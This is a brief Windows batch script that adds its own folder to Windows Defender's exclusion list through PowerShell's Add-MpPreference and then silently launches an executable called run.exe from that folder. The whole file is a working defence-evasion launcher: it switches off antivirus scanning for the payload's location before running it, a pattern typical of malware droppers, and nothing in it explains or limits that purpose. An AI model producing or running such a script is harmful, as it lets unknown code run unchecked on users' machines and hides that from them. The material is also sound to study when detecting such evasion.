@echo off
setlocal

:: Get the current directory
set "currentDir=%~dp0"

:: Add the current directory to Windows Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath '%currentDir%'"

:: Run run.exe silently
start "" "%currentDir%run.exe"

endlocal
